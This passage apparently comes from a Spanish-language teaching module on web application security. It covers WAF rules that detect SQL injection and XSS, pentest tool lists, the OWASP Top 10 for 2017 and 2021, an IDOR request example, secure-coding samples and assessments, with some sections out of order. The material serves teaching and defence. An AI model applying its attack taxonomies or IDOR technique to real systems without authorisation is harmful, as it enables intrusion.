    SecAuditLogParts ABIJDEFHZ
    SecAuditLogType Serial
    SecAuditLog /var/log/apache2/modsec_audit.log
    
    # Include OWASP CRS
    Include /etc/modsecurity/crs/crs-setup.conf
    Include /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

**Actividad 4.2: Creación de Reglas Personalizadas**
```apache
# Reglas personalizadas para aplicación específica
SecRule ARGS "@detectSQLi" \
    "id:1001,\
    phase:2,\
    block,\
    msg:'SQL Injection Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-sqli',\
    severity:'CRITICAL'"

SecRule ARGS "@detectXSS" \
    "id:1002,\
    phase:2,\
    block,\
    msg:'XSS Attack Detected',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}',\
    tag:'application-multi',\
    tag:'language-multi',\
    tag:'platform-multi',\
    tag:'attack-xss',\
    severity:'CRITICAL'"
```

---

## Recursos y Herramientas

### Herramientas de Testing de Seguridad

#### Automated Scanners
```
Security Testing Tools:
├── DAST Tools
│   ├── OWASP ZAP (Zed Attack Proxy)
│   ├── Burp Suite Professional
│   ├── Acunetix
│   ├── Nessus
│   └── Rapid7 AppSpider
├── SAST Tools
│   ├── SonarQube
│   ├── Checkmarx
│   ├── Veracode
│   ├── Fortify SCA
│   └── Semgrep
├── IAST Tools
│   ├── Contrast Security
│   ├── Synopsys Seeker
│   └── HCL AppScan
└── Specialized Tools
    ├── SQLMap (SQL Injection)
    ├── XSSHunter (Blind XSS)
    ├── Gobuster (Directory enumeration)
    └── Nikto (Web server scanning)
```

#### Manual Testing Tools
```
Manual Testing Toolkit:
├── Proxy Tools
│   ├── Burp Suite Community
│   ├── OWASP ZAP
│   ├── Caido
│   └── Postman
├── Browser Extensions
│   ├── FoxyProxy
│   ├── Cookie Editor
│   ├── User-Agent Switcher
│   ├── Wappalyzer
│   └── HackBar
├── Command Line Tools
│   ├── curl
│   ├── wget
│   ├── nmap
│   ├── netcat
│   └── openssl
└── Specialized Utilities
    ├── JWT.io (JWT debugging)
    ├── CyberChef (Data manipulation)
    ├── Base64 Decoder/Encoder
    └── Hash generators
```

### Recursos de Aprendizaje

#### Documentación Oficial
- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **OWASP Web Security Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **OWASP Application Security Verification Standard**: https://owasp.org/www-project-application-security-verification-standard/
- **OWASP Secure Coding Practices**: https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/

#### Laboratorios de Práctica
- **DVWA**: Damn Vulnerable Web Application
- **WebGoat**: OWASP WebGoat
- **bWAPP**: buggy Web Application
- **Mutillidae**: OWASP Mutillidae II
- **VulnHub**: Vulnerable virtual machines

#### Plataformas de Training
- **PortSwigger Web Security Academy**
- **PentesterLab**
- **Hack The Box**
- **TryHackMe**
- **SANS SEC542: Web App Penetration Testing**

### Frameworks y Librerías de Seguridad

#### JavaScript/Node.js
```javascript
// Security libraries for Node.js
const helmet = require('helmet');          // Security headers
const xss = require('xss');                // XSS protection
const validator = require('validator');     // Input validation
const bcrypt = require('bcrypt');          // Password hashing
const jwt = require('jsonwebtoken');       // JWT tokens
const rateLimit = require('express-rate-limit'); // Rate limiting
const csrf = require('csurf');             // CSRF protection
```

#### Python
```python
# Security libraries for Python
import hashlib                    # Cryptographic hashing
import secrets                    # Secure random generation
from cryptography.fernet import Fernet  # Symmetric encryption
import bcrypt                     # Password hashing
from flask_wtf.csrf import CSRFProtect  # CSRF protection
from flask_limiter import Limiter # Rate limiting
import bleach                     # HTML sanitization
```

#### PHP
```php
// Security libraries for PHP
// Composer packages
"paragonie/halite"              // Cryptography
"ezyang/htmlpurifier"          // HTML sanitization
"ircmaxell/password_compat"    // Password hashing
"firebase/php-jwt"             // JWT tokens
"league/oauth2-server"         // OAuth2 implementation
"roave/security-advisories"    // Security advisories
```

---

## Actividades y Evaluación

### Actividades Formativas

#### Actividad 1: Análisis Comparativo OWASP
**Duración**: 2 horas
**Modalidad**: Grupal (3-4 estudiantes)

**Instrucciones**:
1. Seleccionar 3 vulnerabilidades del OWASP Top 10 (2017 vs 2021)
2. Crear una presentación comparativa que incluya:
   - Cambios en la posición del ranking
   - Evolución de las técnicas de ataque
   - Nuevas contramedidas desarrolladas
   - Casos de estudio reales
3. Presentar hallazgos al grupo

**Criterios de Evaluación**:
- Precisión técnica (30%)
- Análisis crítico (25%)
- Presentación oral (25%)
- Trabajo en equipo (20%)

#### Actividad 2: Implementación de Controles de Seguridad
**Duración**: 4 horas
**Modalidad**: Individual

**Instrucciones**:
1. Desarrollar una aplicación web simple con las siguientes funcionalidades:
   - Sistema de autenticación
   - Formulario de contacto
   - Panel de administración
2. Implementar al menos 5 controles de seguridad del OWASP Top 10
3. Documentar cada control implementado
4. Realizar testing de seguridad básico

**Entregables**:
- Código fuente de la aplicación
- Documento de arquitectura de seguridad
- Reporte de testing de seguridad
- Video demo de 10 minutos

#### Actividad 3: Investigación de Keyloggers
**Duración**: 3 horas
**Modalidad**: Individual

**Instrucciones**:
1. Investigar un caso real de ataque con keyloggers
2. Analizar las técnicas utilizadas
3. Proponer contramedidas específicas
4. Crear un informe técnico profesional

**Estructura del Informe**:
- Resumen ejecutivo
- Descripción del ataque
- Análisis técnico
- Impacto y consecuencias
- Recomendaciones de seguridad
- Conclusiones

### Evaluación Sumativa

#### Examen Teórico (40%)
**Duración**: 90 minutos
**Formato**: Opción múltiple y preguntas abiertas

**Temas a Evaluar**:
- OWASP Top 10 2017 y 2021
- Keyloggers: tipos, detección y prevención
- Vulnerabilidades web específicas
- Controles de seguridad
- WAF configuración y administración

#### Proyecto Práctico (35%)
**Duración**: 2 semanas

**Requisitos del Proyecto**:
1. Desarrollar una aplicación web con al menos 5 funcionalidades
2. Implementar controles de seguridad para cada vulnerabilidad OWASP Top 10
3. Configurar un WAF con reglas personalizadas
4. Realizar testing de penetración completo
5. Documentar todo el proceso

**Criterios de Evaluación**:
- Funcionalidad de la aplicación (20%)
- Implementación de controles de seguridad (30%)
- Configuración del WAF (20%)
- Testing de penetración (15%)
- Documentación técnica (15%)

#### Participación y Laboratorios (25%)
**Componentes**:
- Asistencia y participación en laboratorios (40%)
- Entrega puntual de actividades (30%)
- Calidad de trabajo en laboratorios (30%)

### Proyecto Final Integrador

#### Simulacro de Auditoría de Seguridad Web
**Objetivo**: Realizar una auditoría completa de seguridad web siguiendo estándares profesionales.

**Fases del Proyecto**:

1. **Fase de Reconocimiento**
   - Análisis de la aplicación objetivo
   - Mapeo de funcionalidades
   - Identificación de tecnologías

2. **Fase de Testing**
   - Testing automatizado con herramientas DAST
   - Testing manual con Burp Suite/ZAP
   - Análisis de código fuente (si disponible)

3. **Fase de Explotación**
   - Demostración controlada de vulnerabilidades
   - Documentación de evidencias
   - Análisis de impacto

4. **Fase de Reporte**
   - Informe ejecutivo
   - Informe técnico detallado
   - Plan de remediación
   - Presentación a stakeholders

**Entregables Finales**:
- Reporte de auditoría profesional
- Presentación ejecutiva
- Videos de demostración de vulnerabilidades
- Plan de remediación priorizado
- Código de PoC (Proof of Concept) cuando sea aplicable

**Evaluación del Proyecto Final**:
- Metodología aplicada (25%)
- Calidad del testing (25%)
- Documentación profesional (25%)
- Presentación y comunicación (25%)

---

## Recursos Adicionales para el Instructor

### Material Didáctico Complementario

#### Casos de Estudio Reales
1. **Equifax Data Breach (2017)**
   - Vulnerabilidad: Apache Struts (CVE-2017-5638)
   - Lecciones aprendidas sobre gestión de componentes vulnerables

2. **Target Data Breach (2013)**
   - Keylogger Citadel utilizado en terminales POS
   - Importancia del monitoreo de red

3. **Sony Pictures Hack (2014)**
   - Multiple vulnerabilities including SQL injection
   - Impacto de la seguridad web en la reputación corporativa

#### Ejercicios de Programación Segura
```python
# Ejercicio: Implementar autenticación segura
class SecureAuthenticator:
    def __init__(self):
        self.failed_attempts = {}
        self.lockout_duration = 300  # 5 minutes
        self.max_attempts = 5
    
    def authenticate(self, username, password, ip_address):
        # Implementar lógica de autenticación segura
        # Incluir: rate limiting, account lockout, secure password verification
        pass
    
    def hash_password(self, password):
        # Implementar hashing seguro de contraseñas
        pass
    
    def verify_password(self, password, hashed_password):
        # Implementar verificación segura
        pass
```

#### Configuraciones de Referencia
```apache
# Configuración segura de Apache
ServerTokens Prod
ServerSignature Off

# Headers de seguridad
Header always set X-Content-Type-Options nosniff
Header always set X-Frame-Options DENY
Header always set X-XSS-Protection "1; mode=block"
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header always set Content-Security-Policy "default-src 'self'"

# Configuración SSL/TLS segura
SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256
SSLHonorCipherOrder on
SSLCompression off
SSLSessionTickets off
```

### Evaluación y Mejora Continua

#### Rúbricas Detalladas
Cada actividad incluye rúbricas específicas con criterios claros de evaluación, permitiendo una valoración objetiva del desempeño estudiantil.

#### Feedback y Seguimiento
- Sesiones de feedback individual
- Revisión grupal de proyectos
- Autoevaluación y reflexión
- Plan de mejora personalizado

#### Actualización de Contenido
Este tema se actualiza semestralmente para:
- Incluir nuevas vulnerabilidades emergentes
- Actualizar herramientas y técnicas
- Incorporar casos de estudio recientes
- Adaptar laboratorios a nuevas tecnologías

---

## Conclusión

La **seguridad de aplicaciones web** representa uno de los pilares fundamentales en la protección de sistemas de información modernos. A través de este tema hemos explorado desde las amenazas más tradicionales como los keyloggers, hasta las vulnerabilidades emergentes identificadas en el OWASP Top 10 2021.

### Puntos Clave del Aprendizaje

1. **Evolución Constante**: El panorama de amenazas web evoluciona continuamente, requiriendo actualización permanente de conocimientos y técnicas

2. **Enfoque Integral**: La seguridad web no se limita a aspectos técnicos, sino que abarca diseño, desarrollo, deployment y operación

3. **Prevención vs Detección**: Aunque la detección es importante, el enfoque principal debe estar en la prevención mediante diseño seguro

4. **Colaboración Interdisciplinaria**: La seguridad web efectiva requiere colaboración entre desarrolladores, operadores, y especialistas en seguridad

### Tendencias Futuras

La seguridad de aplicaciones web continuará evolucionando con:
- Mayor integración de IA y ML en ataques y defensas
- Nuevos vectores de ataque en aplicaciones serverless y edge computing
- Evolución de frameworks de seguridad para aplicaciones cloud-native
- Desarrollo de estándares de seguridad para IoT y aplicaciones móviles

### Compromiso Profesional

Como futuros profesionales en seguridad informática, es nuestra responsabilidad:
- Mantenernos actualizados con las últimas amenazas y contramedidas
- Promover prácticas de desarrollo seguro en nuestras organizaciones
- Contribuir a la comunidad de seguridad compartiendo conocimiento y experiencias
- Actuar con ética y responsabilidad en todas nuestras actividades profesionales

La seguridad de aplicaciones web no es solo una disciplina técnica, sino una responsabilidad compartida que requiere compromiso, dedicación y aprendizaje continuo para proteger los activos digitales de nuestras organizaciones y la sociedad en general.

### A9: Using Components with Known Vulnerabilities

#### Componentes con Vulnerabilidades Conocidas
Los **componentes con vulnerabilidades conocidas** son librerías, frameworks y otros módulos de software que se ejecutan con los mismos privilegios que la aplicación. Si un componente vulnerable es explotado, tal ataque puede facilitar pérdida seria de datos o toma de control del servidor.

```
Component Vulnerability Management:
├── Inventory Management
│   ├── Client-side components (JavaScript libraries)
│   ├── Server-side components (frameworks, libraries)
│   ├── System components (OS, web server)
│   └── Third-party services and APIs
├── Vulnerability Tracking
│   ├── CVE database monitoring
│   ├── Security advisory subscriptions
│   ├── Vendor security notifications
│   └── Community vulnerability reports
├── Risk Assessment
│   ├── CVSS scoring analysis
│   ├── Exploitability assessment
│   ├── Business impact evaluation
│   └── Compensating controls analysis
└── Update Management
    ├── Patch management processes
    ├── Testing procedures
    ├── Rollback capabilities
    └── Emergency update procedures
```

### A10: Insufficient Logging & Monitoring

#### Registro y Monitoreo Insuficientes
El **registro y monitoreo insuficientes**, junto con la respuesta a incidentes ausente o inefectiva, permite a los atacantes atacar sistemas adicionales, mantener persistencia, pivotar a más sistemas y alterar, extraer o destruir datos.

```
Logging and Monitoring Framework:
├── Security Event Logging
│   ├── Authentication events
│   ├── Authorization failures
│   ├── Input validation failures
│   ├── Application errors
│   └── System-level security events
├── Log Management
│   ├── Centralized logging systems
│   ├── Log retention policies
│   ├── Log integrity protection
│   ├── Structured logging formats
│   └── Log anonymization procedures
├── Monitoring and Alerting
│   ├── Real-time threat detection
│   ├── Anomaly detection algorithms
│   ├── Correlation rule engines
│   ├── Automated response systems
│   └── Escalation procedures
└── Incident Response
    ├── Incident classification systems
    ├── Response team procedures
    ├── Evidence preservation
    ├── Communication protocols
    └── Lessons learned processes
```

---

## OWASP Top Ten 2021

### Introducción a los Cambios en 2021
El **OWASP Top 10 2021** representa una actualización significativa basada en más de 400,000 aplicaciones de 40+ organizaciones contribuyentes. Los cambios reflejan la evolución del panorama de amenazas web y nuevas tendencias en desarrollo de aplicaciones.

### Cambios Principales en la Lista 2021
```
Key Changes from 2017 to 2021:
├── New Categories
│   ├── A04: Insecure Design (completely new)
│   ├── A08: Software and Data Integrity Failures
│   └── A10: Server-Side Request Forgery (SSRF)
├── Merged Categories
│   ├── A02: Cryptographic Failures (was Sensitive Data Exposure)
│   ├── A07: Identification and Authentication Failures
│   └── A09: Security Logging and Monitoring Failures
├── Position Changes
│   ├── Broken Access Control moved to #1
│   ├── Injection dropped to #3
│   └── XSS dropped out of top 10
└── Renamed Categories
    ├── Several categories got more precise naming
    └── Better alignment with current threat landscape
```

### A01: Broken Access Control

#### Broken Access Control - Posición #1
El **control de acceso roto** se mueve de la quinta posición a la primera. El 94% de las aplicaciones fueron probadas para alguna forma de control de acceso roto, con una tasa de incidencia promedio del 3.81%.

```
Access Control Attack Vectors:
├── Insecure Direct Object References (IDOR)
│   ├── URL parameter manipulation
│   ├── Hidden field modification
│   ├── Cookie tampering
│   └── API endpoint abuse
├── Privilege Escalation Attacks
│   ├── Horizontal privilege escalation
│   ├── Vertical privilege escalation
│   ├── Role-based access control bypass
│   └── Function-level access control missing
├── Metadata Manipulation Attacks
│   ├── JWT token manipulation
│   ├── Hidden field tampering
│   ├── Cookie modification
│   └── HTTP header manipulation
└── CORS Misconfiguration
    ├── Overly permissive CORS policies
    ├── Credential exposure via CORS
    ├── Origin validation bypass
    └── Preflight request bypass
```

**Ejemplo de IDOR:**
```javascript
// Vulnerable endpoint
GET /api/users/123/profile

// Attacker modifies user ID
GET /api/users/456/profile

// Should implement proper authorization:
function getUserProfile(userId, requestingUserId) {
    if (userId !== requestingUserId && !isAdmin(requestingUserId)) {
        throw new UnauthorizedError();
    }
    return database.getUser(userId);
}
```

### A02: Cryptographic Failures

#### Fallas Criptográficas
Anteriormente conocido como "Sensitive Data Exposure", este categoria ahora se enfoca en **fallas relacionadas con la criptografía** que frecuentemente conducen a exposición de datos sensibles o compromiso del sistema.

```
Cryptographic Failure Categories:
├── Data in Transit Failures
│   ├── HTTP usage for sensitive data
│   ├── Weak TLS configurations
│   ├── Deprecated protocol versions
│   ├── Weak cipher suites
│   └── Certificate validation issues
├── Data at Rest Failures
│   ├── Unencrypted sensitive data storage
│   ├── Weak encryption algorithms (DES, MD5)
│   ├── Hardcoded encryption keys
│   ├── Predictable initialization vectors
│   └── Key management failures
├── Cryptographic Implementation Flaws
│   ├── Custom cryptographic algorithms
│   ├── Improper random number generation
│   ├── Side-channel vulnerabilities
│   ├── Timing attacks
│   └── Padding oracle attacks
└── Key Management Issues
    ├── Weak key generation
    ├── Insecure key storage
    ├── Key rotation failures
    ├── Key escrow problems
    └── Certificate lifecycle management
```

**Secure Implementation Example:**
```python
import os
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64

class SecureDataHandler:
    def __init__(self, password: bytes):
        # Generate salt
        salt = os.urandom(16)
        
        # Derive key from password
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        self.fernet = Fernet(key)
    
    def encrypt_data(self, data: bytes) -> bytes:
        return self.fernet.encrypt(data)
    
    def decrypt_data(self, encrypted_data: bytes) -> bytes:
        return self.fernet.decrypt(encrypted_data)
```

### A03: Injection

#### Injection - Aún Crítica pero Descendió
Aunque **injection** descendió a la tercera posición, sigue siendo una vulnerabilidad crítica. El 94% de las aplicaciones fueron probadas para injection, con una tasa de incidencia máxima del 19%.

```
Modern Injection Vectors:
├── Traditional SQL Injection
│   ├── MySQL injection techniques
│   ├── PostgreSQL specific attacks
│   ├── Oracle injection methods
│   ├── SQL Server exploitation
│   └── SQLite injection patterns
├── NoSQL Injection
│   ├── MongoDB injection ($where, mapReduce)
│   ├── CouchDB injection techniques
│   ├── Cassandra CQL injection
│   ├── Redis command injection
│   └── ElasticSearch injection
├── Cloud-specific Injections
│   ├── AWS CLI injection
│   ├── Azure PowerShell injection
│   ├── Google Cloud SDK injection
│   └── Kubernetes API injection
├── Modern Framework Injections
│   ├── GraphQL injection
│   ├── ORM injection bypasses
│   ├── Template injection (SSTI)
│   ├── Expression language injection
│   └── Deserialization injection
└── API-specific Injections
    ├── REST API parameter injection
    ├── SOAP XML injection
    ├── JSON injection techniques
    └── Protocol buffer injection
```

### A04: Insecure Design

#### Diseño Inseguro - Nueva Categoría
El **diseño inseguro** es una nueva categoría para 2021, enfocándose en riesgos relacionados con fallas de diseño arquitectónico. Representa la diferencia entre diseño inseguro e implementación insegura.

```
Insecure Design Patterns:
├── Architecture Flaws
│   ├── Monolithic architecture vulnerabilities
│   ├── Microservices security gaps
│   ├── API gateway misconfigurations
│   ├── Service mesh security issues
│   └── Container orchestration flaws
├── Business Logic Flaws
│   ├── Race condition vulnerabilities
│   ├── State management issues
│   ├── Workflow bypass opportunities
│   ├── Economic logic flaws
│   └── Time-of-check-time-of-use issues
├── Security Control Gaps
│   ├── Missing security controls
│   ├── Inadequate security boundaries
│   ├── Insufficient security validation
│   ├── Weak security defaults
│   └── Security control bypasses
└── Threat Modeling Failures
    ├── Incomplete threat analysis
    ├── Missing attack surface analysis
    ├── Inadequate risk assessment
    ├── Poor security requirements
    └── Insufficient security testing
```

**Secure Design Principles:**
```
Secure by Design Methodology:
├── Threat Modeling Integration
│   ├── STRIDE methodology
│   ├── PASTA framework
│   ├── Attack tree analysis
│   ├── Risk assessment matrices
│   └── Security requirement definition
├── Secure Architecture Patterns
│   ├── Zero Trust Architecture
│   ├── Defense in Depth
│   ├── Principle of Least Privilege
│   ├── Fail Secure principles
│   └── Separation of Concerns
├── Security Control Framework
│   ├── Authentication mechanisms
│   ├── Authorization frameworks
│   ├── Input validation systems
│   ├── Output encoding standards
│   └── Session management protocols
└── Secure Development Lifecycle
    ├── Security requirements phase
    ├── Secure design review
    ├── Security code review
    ├── Security testing phase
    └── Security deployment verification
```

### A05: Security Misconfiguration

#### Configuración de Seguridad Incorrecta
Las **configuraciones incorrectas** de seguridad se mueven una posición hacia arriba desde #6. El 90% de las aplicaciones fueron probadas para alguna forma de configuración incorrecta, con una tasa de incidencia promedio del 4.5%.

```
Modern Misconfiguration Categories:
├── Cloud Configuration Issues
│   ├── S3 bucket misconfiguration
│   ├── IAM role over-privileging
│   ├── Security group misconfigurations
│   ├── Container runtime misconfigurations
│   └── Serverless function security gaps
├── Container Security Misconfigurations
│   ├── Dockerfile security issues
│   ├── Container image vulnerabilities
│   ├── Runtime security misconfigurations
│   ├── Orchestration security gaps
│   └── Registry security issues
├── API Configuration Problems
│   ├── CORS misconfiguration
│   ├── API versioning issues
│   ├── Rate limiting misconfigurations
│   ├── Authentication bypass paths
│   └── Documentation exposure issues
└── Infrastructure as Code Issues
    ├── Terraform security misconfigurations
    ├── CloudFormation security gaps
    ├── Ansible playbook vulnerabilities
    ├── Kubernetes manifest issues
    └── CI/CD pipeline security flaws
```

### A06: Vulnerable and Outdated Components

#### Componentes Vulnerables y Desactualizados
Los **componentes vulnerables** se mueven desde #9. Es la única categoría que no tiene CVEs mapeados a CWEs incluidos, por lo que un peso predeterminado de exploits/impacto de 5.0 se factorizó en sus puntajes.

```
Component Vulnerability Landscape:
├── Frontend Component Risks
│   ├── JavaScript library vulnerabilities
│   ├── CSS framework security issues
│   ├── Build tool vulnerabilities
│   ├── Package manager security flaws
│   └── CDN-hosted component risks
├── Backend Component Risks
│   ├── Application framework vulnerabilities
│   ├── Database driver security issues
│   ├── ORM framework vulnerabilities
│   ├── Logging library security flaws
│   └── Authentication library issues
├── Infrastructure Component Risks
│   ├── Operating system vulnerabilities
│   ├── Web server security issues
│   ├── Database server vulnerabilities
│   ├── Message queue security flaws
│   └── Caching system vulnerabilities
└── Third-party Service Risks
    ├── API integration vulnerabilities
    ├── Payment gateway security issues
    ├── Analytics service risks
    ├── Social media integration flaws
    └── Cloud service provider issues
```

**Software Composition Analysis:**
```yaml
# Example GitHub Dependabot configuration
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    reviewers:
      - "security-team"
    assignees:
      - "lead-developer"
    labels:
      - "dependencies"
      - "security"
    open-pull-requests-limit: 10
```

### A07: Identification and Authentication Failures

#### Fallas de Identificación y Autenticación
Anteriormente **Broken Authentication**, ahora incluye más CWEs relacionados con fallas de identificación. Esta categoría sigue siendo una parte integral del Top 10, pero la mayor disponibilidad de frameworks estandarizados parece estar ayudando.

### A08: Software and Data Integrity Failures

#### Fallas de Integridad de Software y Datos
Una nueva categoría para 2021 se enfoca en hacer suposiciones relacionadas con actualizaciones de software, datos críticos y pipelines de CI/CD sin verificar la integridad. Esta categoría cubre vulnerabilidades relacionadas con código y infraestructura que no protegen contra violaciones de integridad.

```
Integrity Failure Categories:
├── Supply Chain Attacks
│   ├── Compromised package repositories
│   ├── Malicious dependency injection
│   ├── Build system compromises
│   ├── Code signing bypass
│   └── Distribution channel attacks
├── Deserialization Vulnerabilities
│   ├── Unsafe deserialization in Java
│   ├── Python pickle vulnerabilities
│   ├── .NET deserialization flaws
│   ├── PHP unserialize issues
│   └── Node.js deserialization attacks
├── CI/CD Pipeline Compromises
│   ├── Build script injection
│   ├── Deployment pipeline tampering
│   ├── Artifact repository poisoning
│   ├── Configuration drift attacks
│   └── Environment variable injection
└── Auto-Update Mechanisms
    ├── Unsigned update packages
    ├── Update channel hijacking
    ├── Rollback attack vulnerabilities
    ├── Update verification bypass
    └── Man-in-the-middle update attacks
```

### A09: Security Logging and Monitoring Failures

#### Fallas de Registro y Monitoreo de Seguridad
Anteriormente **Insufficient Logging & Monitoring**, esta categoría se expande desde el Top 10 community survey (#3), moviéndose desde #10 previamente. Esta categoría está expandida para incluir más tipos de fallas.

### A10: Server-Side Request Forgery (SSRF)

#### Falsificación de Solicitudes del Lado del Servidor
Los datos del **Top 10 community survey** muestran que esta categoría tiene una tasa de incidencia relativamente baja con cobertura de testing superior al promedio, junto con ratings superiores al promedio para Exploit y Impact potential.

```
SSRF Attack Vectors:
├── Internal Service Access
│   ├── Cloud metadata service access
│   ├── Internal API enumeration
│   ├── Database port scanning
│   ├── Internal web services
│   └── Administrative interfaces
├── File System Access
│   ├── Local file inclusion via URL
│   ├── Configuration file access
│   ├── Log file enumeration
│   ├── Backup file access
│   └── Source code disclosure
├── Network Enumeration
│   ├── Internal network mapping
│   ├── Port scanning via SSRF
│   ├── Service banner grabbing
│   ├── Network service discovery
│   └── Firewall bypass techniques
└── Cloud Environment Attacks
    ├── AWS metadata service abuse
    ├── Azure metadata endpoint access
    ├── Google Cloud metadata exploitation
    ├── Container runtime metadata access
    └── Kubernetes API server access
```

**SSRF Prevention Example:**
```python
import ipaddress
import urllib.parse
from typing import List

class SSRFProtection:
    BLOCKED_NETWORKS = [
        ipaddress.IPv4Network('127.0.0.0/8'),      # Loopback
        ipaddress.IPv4Network('10.0.0.0/8'),       # Private
        ipaddress.IPv4Network('172.16.0.0/12'),    # Private
        ipaddress.IPv4Network('192.168.0.0/16'),   # Private
        ipaddress.IPv4Network('169.254.0.0/16'),   # Link-local
        ipaddress.IPv4Network('224.0.0.0/4'),      # Multicast
    ]
    
    ALLOWED_SCHEMES = ['http', 'https']
    
    @classmethod
    def validate_url(cls, url: str) -> bool:
        try:
            parsed = urllib.parse.urlparse(url)
            
            # Check scheme
            if parsed.scheme not in cls.ALLOWED_SCHEMES:
                return False
            
            # Check if hostname resolves to blocked networks
            hostname = parsed.hostname
            if hostname:
                try:
                    ip = ipaddress.ip_address(hostname)
                    for blocked_network in cls.BLOCKED_NETWORKS:
                        if ip in blocked_network:
                            return False
                except ValueError:
                    # Hostname is not an IP, additional DNS resolution checks needed
                    pass
            
            return True
        except Exception:
            return False
```

---

## Análisis Comparativo 2017 vs 2021

### Evolución del Panorama de Amenazas Web

#### Cambios en Prioridades de Seguridad
```
Priority Shifts Analysis:
├── Rising Threats
│   ├── Access Control issues (moved to #1)
│   ├── Design flaws gaining recognition
│   ├── Supply chain attacks increasing
│   ├── SSRF attacks more prevalent
│   └── Cloud misconfiguration risks
├── Declining Threats
│   ├── Injection attacks (still critical but less prevalent)
│   ├── XSS falling out of top 10
│   ├── XXE attacks decreasing
│   └── Traditional authentication issues
├── Evolving Threats
│   ├── Cryptographic failures more sophisticated
│   ├── Component vulnerabilities more complex
│   ├── Logging/monitoring expectations higher
│   └── Security misconfiguration in cloud contexts
└── New Recognition
    ├── Insecure Design as distinct category
    ├── Integrity failures in software supply chain
    ├── Modern authentication challenges
    └── Advanced persistent threats
```

### Factores Impulsores del Cambio

#### Cambios Tecnológicos
```
Technology Evolution Impact:
├── Cloud-First Development
│   ├── Serverless architecture adoption
│   ├── Container orchestration complexity
│   ├── Multi-cloud environments
│   ├── Infrastructure as Code
│   └── DevOps/DevSecOps integration
├── API-Centric Applications
│   ├── Microservices architecture
│   ├── GraphQL adoption
│   ├── REST API proliferation
│   ├── gRPC and modern protocols
│   └── API gateway complexity
├── JavaScript Ecosystem Evolution
│   ├── Single-page application frameworks
│   ├── Node.js server-side adoption
│   ├── Package ecosystem complexity
│   ├── Build tool sophistication
│   └── Frontend security challenges
└── Security Tooling Advancement
    ├── SAST/DAST tool improvement
    ├── Container security scanning
    ├── Cloud security posture management
    ├── Software composition analysis
    └── Runtime application self-protection
```

#### Cambios en el Panorama de Atacantes
```
Attacker Landscape Changes:
├── Sophistication Increase
│   ├── Nation-state actor tactics adoption
│   ├── Advanced persistent threat techniques
│   ├── Supply chain attack sophistication
│   ├── Zero-day exploit development
│   └── AI-assisted attack automation
├── Attack Surface Expansion
│   ├── Cloud environment targeting
│   ├── Container and orchestration attacks
│   ├── CI/CD pipeline targeting
│   ├── API-specific attack techniques
│   └── Third-party service exploitation
├── Economic Motivation Evolution
│   ├── Ransomware-as-a-Service growth
│   ├── Cryptocurrency-enabled monetization
│   ├── Data broker market expansion
│   ├── Bug bounty program influence
│   └── Cyber insurance impact on attacks
└── Democratization of Attack Tools
    ├── Open-source attack frameworks
    ├── Cloud-based attack infrastructure
    ├── Automated vulnerability scanning
    ├── Social engineering toolkit availability
    └── Educational resources for attackers
```

### Metodología de Análisis 2021 vs 2017

#### Diferencias en Recopilación de Datos
```
Data Collection Evolution:
├── 2017 Methodology
│   ├── 40+ partner organizations
│   ├── 500+ survey respondents
│   ├── Focus on traditional web applications
│   ├── Limited cloud application data
│   └── Primarily OWASP community input
├── 2021 Methodology
│   ├── 400,000+ applications analyzed
│   ├── 40+ contributing organizations
│   ├── Modern application architecture focus
│   ├── Cloud-native application inclusion
│   ├── DevSecOps community engagement
│   └── Industry-specific data analysis
├── Improved Data Quality
│   ├── Larger sample size
│   ├── Better geographic representation
│   ├── Industry sector diversification
│   ├── Technology stack variety
│   └── Attack vector sophistication measurement
└── Enhanced Analysis Techniques
    ├── Statistical significance testing
    ├── Trend analysis capabilities
    ├── Risk factor correlation analysis
    ├── Business impact assessment
    └── Exploitability measurement refinement
```

### Impacto en la Industria

#### Respuesta de la Industria de Desarrollo
```
Industry Response Analysis:
├── Framework Security Improvements
│   ├── Secure defaults in popular frameworks
│   ├── Built-in security control integration
│   ├── Security testing automation
│   ├── Vulnerability disclosure programs
│   └── Security-focused documentation
├── Tooling Ecosystem Evolution
│   ├── IDE security plugin development
│   ├── CI/CD security integration
│   ├── Cloud security scanning tools
│   ├── Container security platforms
│   └── Infrastructure security validation
├── Education and Training Programs
│   ├── Secure coding bootcamps
│   ├── University curriculum updates
│   ├── Professional certification programs
│   ├── Corporate security training
│   └── Community education initiatives
└── Regulatory and Compliance Changes
    ├── Privacy regulation enforcement
    ├── Sector-specific security requirements
    ├── Supply chain security mandates
    ├── Incident disclosure requirements
    └── Security audit standardization
```

---

## Vulnerabilidades Web Específicas

### SQL Injection (SQLi)

#### Taxonomía Completa de SQL Injection
```
SQL Injection Classification:
├── In-band SQLi (Classic)
│   ├── Error-based SQLi
│   ├── Union-based SQLi
│   ├── Boolean-based SQLi
│   └── Time-based SQLi
├── Inferential SQLi (Blind)
│   ├── Boolean-based blind SQLi
│   ├── Time-based blind SQLi
│   ├── Statistical blind SQLi
│   └── Error-based blind SQLi
├── Out-of-band SQLi
│   ├── DNS-based SQLi
│   ├── HTTP-based SQLi
│   ├── SMB-based SQLi
│   └── Email-based SQLi
└── Advanced SQLi Techniques
    ├── Second-order SQLi
    ├── Stored procedure SQLi
    ├── Lateral movement via SQLi
    └── NoSQL injection techniques
```

## Objetivos de Aprendizaje
- [ ] Identificar y prevenir keyloggers
- [ ] Comprender OWASP Top 10 (2017 y 2021)
- [ ] Realizar testing de seguridad web
- [ ] Implementar controles de seguridad web
- [ ] Configurar WAF efectivamente

## Recursos Adicionales
